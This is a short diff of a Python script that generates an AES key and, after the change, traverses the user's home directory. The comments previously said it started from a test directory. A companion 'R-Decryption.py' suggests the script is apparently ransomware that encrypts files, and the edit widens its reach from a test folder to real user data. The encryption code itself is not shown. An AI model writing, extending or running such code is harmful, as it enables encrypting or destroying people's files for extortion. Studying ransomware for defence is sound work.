@@ -125,10 +125,9 @@ def main():
     #represented in bytes 32 bytes = 256 bits
     aes_key = os.urandom(32)
     
-    #for this example, we will just use a test directory
-    #start from the test directory, pass it to the traverse function
-    #the starting directory could easily be changed, just make sure you change 
-    #  change the corresponding line in R-Decryption.py
+    #start from the home directory, pass it to the traverse function
+    #the starting directory could easily be changed, just make sure you change
+    #the corresponding directory in R-Decryption.py
     home = os.environ['HOME']
     #test_dir = os.path.join()
     
